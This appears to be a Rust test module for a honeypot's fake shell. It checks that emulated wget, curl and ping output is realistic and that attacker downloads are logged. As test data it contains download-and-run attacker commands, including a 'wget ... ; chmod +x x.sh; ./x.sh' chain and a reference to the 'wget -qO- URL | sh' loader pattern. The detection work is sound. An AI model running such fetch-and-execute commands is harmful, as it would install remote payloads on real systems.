    #[test]
    fn busybox_applet_set() {
        assert!(is_busybox_applet("wget"));
        assert!(is_busybox_applet("sh"));
        assert!(!is_busybox_applet("MIRAI"));
    }

    #[test]
    fn wget_derives_the_saved_filename_from_the_url() {
        let out = cmd_wget(&["wget", "http://198.51.100.9/bins/mips"]);
        assert!(out.contains("Saving to: 'mips'"), "got: {out}");
        assert!(
            !out.contains("index.html"),
            "constant filename tell remains: {out}"
        );
    }

    #[test]
    fn wget_quiet_suppresses_the_banner() {
        assert_eq!(cmd_wget(&["wget", "-q", "http://x/y"]), "");
    }

    #[test]
    fn wget_dash_big_o_dash_writes_body_to_stdout() {
        // The `wget -qO- URL | sh` loader pattern: content goes to stdout, not a transcript.
        let out = cmd_wget(&["wget", "-qO-", "http://x/y"]);
        assert!(out.contains("It works!"), "got: {out}");
    }

    #[test]
    fn curl_dash_big_o_is_silent_on_stdout() {
        // A real `curl -O URL` writes a file and prints nothing to stdout - the old code printed the
        // body, a clean one-probe tell.
        assert_eq!(cmd_curl(&["curl", "-O", "http://x/y"]), "");
        assert_eq!(cmd_curl(&["curl", "-o", "out", "http://x/y"]), "");
        // Without -o/-O, curl prints the body to stdout.
        assert!(cmd_curl(&["curl", "http://x/y"]).contains("It works!"));
    }

    #[test]
    fn ping_is_not_command_not_found() {
        let (out, _) = shell().handle_input("ping 8.8.8.8");
        assert!(out.contains("ping statistics"), "got: {out}");
        assert!(!out.contains("command not found"), "got: {out}");
    }

    #[test]
    fn sh_dash_c_wget_chain_is_captured_as_a_download() {
        let (_, events) =
            shell().handle_input("sh -c \"wget http://198.51.100.9/x.sh; chmod +x x.sh; ./x.sh\"");
        let dl = events
            .iter()
            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .expect("a wget URL inside sh -c must still be captured");
        assert_eq!(dl.metadata["url"], "http://198.51.100.9/x.sh");
    }

    #[test]
    fn url_scan_only_fires_with_a_fetch_verb() {
        assert_eq!(
            url_if_fetch_line("wget http://a/b"),
            Some("http://a/b"),
            "fetch verb + url should capture"
        );
        assert_eq!(
            url_if_fetch_line("echo http://a/b"),
            None,
            "a bare echo of a url is not a download"
        );
    }
}
